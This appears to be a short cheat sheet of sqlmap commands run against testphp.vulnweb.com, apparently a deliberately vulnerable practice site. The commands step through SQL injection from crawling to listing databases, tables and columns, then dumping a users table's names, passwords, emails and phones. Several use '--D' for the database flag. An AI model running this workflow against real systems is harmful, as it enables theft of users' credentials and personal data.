sqlmap -u http://www.vulnweb.com/ --crawl=3 --batch

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs --batch 

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --D dbname --tables --batch 

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --D dbname -T users --columns --batch 

sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --D dbname -T users -C name,pass,email,phone --dump --batch 

